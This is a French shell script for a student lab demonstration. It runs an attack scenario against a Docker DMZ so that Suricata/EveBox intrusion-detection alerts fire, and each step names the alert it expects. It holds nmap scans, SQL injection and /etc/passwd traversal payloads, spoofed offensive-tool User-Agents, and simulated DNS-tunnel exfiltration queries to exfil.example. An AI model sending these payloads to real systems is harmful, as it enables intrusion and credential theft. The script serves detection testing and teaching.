#!/bin/sh
# =============================================================================
#  Groupe 2 - Scenario d'attaque pilote (DMZ 172.20.0.0/24)
#  A executer depuis le conteneur attaquant :
#      docker compose run --rm attacker
#  Chaque etape est separee par une pause pour commenter en direct pendant la
#  soutenance. Les alertes attendues sont affichees en fin d'etape.
# =============================================================================
set -u

WEB_HOST="${WEB_HOST:-172.20.0.10}"
API_HOST="${API_HOST:-172.20.0.12}"
DB_HOST="${DB_HOST:-172.20.0.11}"
EVEBOX_HOST="${EVEBOX_HOST:-172.20.0.14}"
DNS_RESOLVER="${DNS_RESOLVER:-}"
DNS_BURST="${DNS_BURST:-40}"
PAUSE_SECONDS="${PAUSE_SECONDS:-4}"

MODE_PAUSE="pauses courtes"
FAST=0

# --- rendu ------------------------------------------------------------------
if [ -t 1 ]; then
    BOLD=$(printf '\033[1m'); DIM=$(printf '\033[2m')
    RED=$(printf '\033[31m'); GREEN=$(printf '\033[32m')
    YELLOW=$(printf '\033[33m'); CYAN=$(printf '\033[36m')
    RESET=$(printf '\033[0m')
else
    BOLD=; DIM=; RED=; GREEN=; YELLOW=; CYAN=; RESET=
fi

usage() {
    cat <<'EOF'
Usage : scenario.sh [options]

  --no-pause     enchaine les etapes sans attendre (repetition automatisee)
  --fast         reduit le nombre de requetes DNS (demonstration courte)
  --interactive  force l'attente d'une touche Entree entre les etapes
  -h, --help     affiche cette aide

Variables d'environnement :
  WEB_HOST       cible HTTP du portail          (defaut 172.20.0.10)
  API_HOST       cible de l'API FastAPI         (defaut 172.20.0.12)
  DNS_RESOLVER   resolveur interroge pour le tunnel DNS (defaut : deduit de
                 /etc/resolv.conf, sinon 1.1.1.1)
  DNS_BURST      nombre de requetes DNS envoyees (defaut 40)
  PAUSE_SECONDS  duree des pauses non interactives (defaut 4)
EOF
}

for arg in "$@"; do
    case "$arg" in
        --no-pause)    MODE_PAUSE="aucune pause"; MODE_SANS_PAUSE=1 ;;
        --interactive) MODE_PAUSE="Entree entre les etapes"; MODE_FORCE_TTY=1 ;;
        --fast)        FAST=1; DNS_BURST=15 ;;
        -h|--help)     usage; exit 0 ;;
        *)             echo "Option inconnue : $arg" >&2; usage >&2; exit 2 ;;
    esac
done

step_no=0

titre() {
    step_no=$((step_no + 1))
    printf '\n%s%s== Etape %s : %s%s\n' "$BOLD" "$CYAN" "$step_no" "$1" "$RESET"
    printf '%s%s%s\n' "$DIM" "-----------------------------------------------------------------------" "$RESET"
    [ -n "${2:-}" ] && printf '%s\n' "$2"
    return 0
}

attendu() {
    printf '%s  Alertes attendues : %s%s\n' "$YELLOW" "$1" "$RESET"
}

pause() {
    if [ -n "${MODE_SANS_PAUSE:-}" ]; then
        return 0
    fi
    if [ -n "${MODE_FORCE_TTY:-}" ] || [ -t 0 ]; then
        printf '%s  [Entree pour continuer]%s ' "$DIM" "$RESET"
        read -r _ || true
        return 0
    fi
    printf '%s  (pause de %s s)%s\n' "$DIM" "$PAUSE_SECONDS" "$RESET"
    sleep "$PAUSE_SECONDS"
}

# Resolveur : celui du conteneur (127.0.0.11 renvoie au demon Docker, donc on
# prefere une adresse explicite si elle est fournie par l'environnement).
if [ -z "$DNS_RESOLVER" ]; then
    DNS_RESOLVER=$(awk '/^nameserver/ { print $2; exit }' /etc/resolv.conf 2>/dev/null)
    case "$DNS_RESOLVER" in
        ""|127.0.0.11|127.0.0.53) DNS_RESOLVER="1.1.1.1" ;;
    esac
fi

# --- preambule --------------------------------------------------------------
printf '%s%s\n' "$BOLD" "======================================================================="
printf '  Groupe 2 - Scenario d attaque NDR (Suricata + EveBox)\n'
printf '%s%s\n' "=======================================================================" "$RESET"
printf '  Portail web      : http://%s/\n' "$WEB_HOST"
printf '  API FastAPI      : http://%s:8000/\n' "$API_HOST"
printf '  Base PostgreSQL  : %s:5432\n' "$DB_HOST"
printf '  Console EveBox   : http://127.0.0.1:5636 (depuis l hote)\n'
printf '  Resolveur DNS    : %s\n' "$DNS_RESOLVER"
printf '  Pauses           : %s\n' "$MODE_PAUSE"
printf '\n  La sonde capture le bridge en af-packet ; chaque etape produit du\n'
printf '  trafic reellement observable par Suricata, pas une simulation.\n'

for outil in nmap curl dig; do
    if ! command -v "$outil" >/dev/null 2>&1; then
        printf '%sOutil manquant : %s%s\n' "$RED" "$outil" "$RESET" >&2
        exit 1
    fi
done

printf '\n%sVerification de la cible...%s\n' "$DIM" "$RESET"
code=$(curl -s -o /dev/null -m 5 -w '%{http_code}' "http://${WEB_HOST}/" || echo 000)
if [ "$code" = "000" ]; then
    printf '%s  %s ne repond pas. La pile est-elle demarree ?%s\n' \
        "$RED" "$WEB_HOST" "$RESET" >&2
    printf '  (docker compose up -d)\n' >&2
    exit 1
fi
printf '  http://%s/ -> %s%s%s\n' "$WEB_HOST" "$GREEN" "$code" "$RESET"
pause

# --- 1. reconnaissance ------------------------------------------------------
titre "Reconnaissance - scan SYN puis detection de versions" \
    "nmap -sS (demi-connexion, jamais de session TCP complete) puis nmap -sV."

printf '%s> nmap -sS -Pn -n --top-ports 200 -T4%s\n' "$BOLD" "$RESET"
nmap -sS -Pn -n --top-ports 200 -T4 \
    "$WEB_HOST" "$API_HOST" "$DB_HOST" "$EVEBOX_HOST" 2>&1 |
    grep -vE '^$|^Starting Nmap|^Nmap done' || true

attendu "ET SCAN / ET POLICY (balayage de ports vers la DMZ)"
pause

printf '\n%s> nmap -sV -Pn -n -p 80,8000,5432,5636%s\n' "$BOLD" "$RESET"
nmap -sV -Pn -n -p 80,8000,5432,5636 \
    "$WEB_HOST" "$API_HOST" 2>&1 |
    grep -vE '^$|^Starting Nmap|^Nmap done' || true

attendu "ET SCAN Nmap / ET INFO services exposes"
pause

# --- 2. injection SQL et traversee de repertoire ----------------------------
titre "Injection SQL et traversee de repertoire" \
    "Charges envoyees en GET ; le portail les journalise et l API les traite."

printf '%s> curl "http://%s/api/me?id=1%%27%%20UNION%%20SELECT%%20username,password%%20FROM%%20users--"%s\n' \
    "$BOLD" "$WEB_HOST" "$RESET"
curl -s -o /dev/null -w '  -> HTTP %{http_code}\n' \
    "http://${WEB_HOST}/api/me?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"
sleep 1

printf '%s> curl "http://%s/api/me?id=1%%27%%20OR%%20%%271%%27%%3D%%271"%s\n' \
    "$BOLD" "$WEB_HOST" "$RESET"
curl -s -o /dev/null -w '  -> HTTP %{http_code}\n' \
    "http://${WEB_HOST}/api/me?id=1%27%20OR%20%271%27%3D%271"
sleep 1

printf '%s> curl --path-as-is "http://%s/../../../../etc/passwd"%s\n' \
    "$BOLD" "$WEB_HOST" "$RESET"
curl -s --path-as-is -o /dev/null -w '  -> HTTP %{http_code}\n' \
    "http://${WEB_HOST}/../../../../etc/passwd"
sleep 1

printf '%s> curl --path-as-is "http://%s/%%2e%%2e%%2f%%2e%%2e%%2fetc%%2fpasswd"%s\n' \
    "$BOLD" "$WEB_HOST" "$RESET"
curl -s --path-as-is -o /dev/null -w '  -> HTTP %{http_code}\n' \
    "http://${WEB_HOST}/%2e%2e%2f%2e%2e%2fetc%2fpasswd"

attendu "sid 2000001 (injection SQL) + ET WEB_SERVER SELECT USER"
pause

# --- 3. outil offensif identifie par son User-Agent -------------------------
titre "Reconnaissance automatisee - signature sqlmap" \
    "Meme requete, mais avec l en-tete d un outil offensif : la detection ne
  depend plus de la charge utile mais de l outillage employe."

for agent in "sqlmap/1.8.2#stable" "nikto/2.1.6" "gobuster/3.6"; do
    printf '%s> User-Agent: %s%s\n' "$BOLD" "$agent" "$RESET"
    curl -s -o /dev/null -w '  -> HTTP %{http_code}\n' \
        -A "$agent" "http://${WEB_HOST}/"
    sleep 1
done

attendu "sid 2000002 (User-Agent d outil offensif) + ET SCAN Sqlmap"
pause

# --- 4. tunnel DNS ----------------------------------------------------------
titre "Tunnel DNS - exfiltration simulee" \
    "Des dizaines de sous-domaines aleatoires de 48 caracteres partent vers le
  resolveur : signature typique d un tunnel DNS (iodine, dnscat2)."

expr_label() { od -An -N24 -tx1 /dev/urandom | tr -d ' \n'; }

printf '%s> %s requetes <label>.exfil.example vers %s%s\n' \
    "$BOLD" "$DNS_BURST" "$DNS_RESOLVER" "$RESET"
i=0
while [ "$i" -lt "$DNS_BURST" ]; do
    label=$(expr_label)
    dig +short +time=1 +tries=1 "@${DNS_RESOLVER}" "${label}.exfil.example" \
        >/dev/null 2>&1 &
    i=$((i + 1))
done
wait

printf '  -> %s requetes envoyees\n' "$DNS_BURST"
sleep 1

printf '\n%s> domaines de tunnel connus%s\n' "$BOLD" "$RESET"
for domaine in tunnel.ngrok.io atelier.duckdns.org relais.no-ip.org; do
    printf '  %-24s ' "$domaine"
    dig +short +time=1 +tries=1 "@${DNS_RESOLVER}" "$domaine" >/dev/null 2>&1 &&
        echo "envoye" || echo "envoye (sans reponse)"
done

attendu "sid 2000003 (volume DNS) + sid 2000004 (label long) + sid 2000005 (domaine de tunnel)"
pause

# --- 5. lecture des alertes -------------------------------------------------
titre "Verification cote sonde" \
    "Le scenario ne fait qu emettre du trafic : la detection est faite par la
  sonde, hors du conteneur attaquant."

cat <<EOF

  Depuis l hote :

    docker exec g2-suricata sh -c \\
      'grep "\\"event_type\\":\\"alert\\"" /var/log/suricata/eve.json | wc -l'

    docker exec g2-suricata sh -c \\
      'grep "\\"event_type\\":\\"alert\\"" /var/log/suricata/eve.json | tail -5'

  Dans EveBox : http://127.0.0.1:5636  (identifiants dans .env)
    filtre  alert.signature_id:2000001  -> injection SQL
    filtre  alert.signature_id:2000002  -> User-Agent offensif
    filtre  alert.signature_id:2000003  -> volume DNS anormal
    filtre  alert.signature_id:2000004  -> label DNS tres long
    filtre  alert.signature_id:2000005  -> domaine de tunnel

EOF

printf '%s%sScenario termine.%s\n' "$BOLD" "$GREEN" "$RESET"
